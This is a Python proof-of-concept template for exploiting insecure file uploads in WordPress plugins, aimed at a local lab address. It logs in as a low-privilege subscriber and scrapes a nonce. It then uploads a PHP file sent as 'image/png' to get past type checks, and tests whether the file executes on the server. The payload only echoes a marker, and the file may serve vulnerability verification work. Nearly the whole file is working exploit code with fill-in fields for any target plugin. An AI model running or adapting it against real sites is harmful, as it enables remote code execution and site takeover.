#!/usr/bin/env python3
"""
PoC Template: File Upload via AJAX/Form
Usage: python3 poc.py --url http://172.17.0.1:8000
"""
import argparse
import re
import sys
import requests

# === CUSTOMIZE ===
UPLOAD_ENDPOINT = "/wp-admin/admin-ajax.php"  # Or REST route
AJAX_ACTION = "your_upload_action"            # Set to None for REST
NONCE_PAGE = "/wp-admin/admin.php?page=your-plugin"
NONCE_REGEX = r'["\']_wpnonce["\']\s*[,:]\s*["\']([a-f0-9]+)["\']'
USERNAME = "subscriber"
PASSWORD = "subscriber"
UPLOAD_FIELD = "file"                         # Name of the file input field
UPLOAD_FILENAME = "test.php"                  # Filename to upload
UPLOAD_CONTENT = b"<?php echo 'RCE_CONFIRMED'; ?>"
UPLOAD_CONTENT_TYPE = "image/png"             # MIME type to send (for bypass)
EXTRA_DATA = {
    # "param1": "value1",
}
EXPECTED_UPLOAD_PATH = "/wp-content/uploads/"  # Where the file should end up
EXPECTED_RESULT = {
    "status_code": 200,
    "body_contains": "success",
}
# === END CUSTOMIZE ===


def login(session, base_url):
    session.post(f"{base_url}/wp-login.php", data={
        "log": USERNAME, "pwd": PASSWORD,
        "wp-submit": "Log In",
        "redirect_to": f"{base_url}/wp-admin/",
        "testcookie": "1",
    }, allow_redirects=False)
    if "wordpress_logged_in" not in str(session.cookies):
        print(f"[FAIL] Login failed for {USERNAME}")
        sys.exit(1)
    print(f"[+] Logged in as {USERNAME}")


def get_nonce(session, base_url):
    r = session.get(f"{base_url}{NONCE_PAGE}")
    match = re.search(NONCE_REGEX, r.text)
    if not match:
        print(f"[FAIL] Could not find nonce")
        sys.exit(1)
    nonce = match.group(1)
    print(f"[+] Got nonce: {nonce}")
    return nonce


def exploit(session, base_url, nonce):
    data = {**EXTRA_DATA}
    if AJAX_ACTION:
        data["action"] = AJAX_ACTION
    data["_wpnonce"] = nonce

    files = {
        UPLOAD_FIELD: (UPLOAD_FILENAME, UPLOAD_CONTENT, UPLOAD_CONTENT_TYPE),
    }

    url = f"{base_url}{UPLOAD_ENDPOINT}"
    r = session.post(url, data=data, files=files)
    return r


def verify_upload(session, base_url, response):
    """Verify the file was uploaded and is accessible."""
    ok = True
    if EXPECTED_RESULT.get("status_code") and response.status_code != EXPECTED_RESULT["status_code"]:
        ok = False
    if EXPECTED_RESULT.get("body_contains") and EXPECTED_RESULT["body_contains"] not in response.text:
        ok = False

    # Try to access the uploaded file
    if EXPECTED_UPLOAD_PATH and UPLOAD_FILENAME:
        check_url = f"{base_url}{EXPECTED_UPLOAD_PATH}{UPLOAD_FILENAME}"
        check = session.get(check_url)
        if "RCE_CONFIRMED" in check.text:
            print(f"[+] Uploaded file is accessible and executable: {check_url}")
        elif check.status_code == 200:
            print(f"[+] Uploaded file is accessible: {check_url}")
        else:
            print(f"[-] Uploaded file not found at: {check_url}")

    return ok


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://172.17.0.1:8000")
    args = parser.parse_args()

    session = requests.Session()
    login(session, args.url)
    nonce = get_nonce(session, args.url)
    response = exploit(session, args.url, nonce)

    print(f"[*] Response: {response.status_code}")
    print(f"[*] Body: {response.text[:500]}")

    if verify_upload(session, args.url, response):
        print("\n[SUCCESS] File upload exploit confirmed!")
        sys.exit(0)
    else:
        print("\n[FAIL] Exploit did not produce expected result")
        sys.exit(1)


if __name__ == "__main__":
    main()
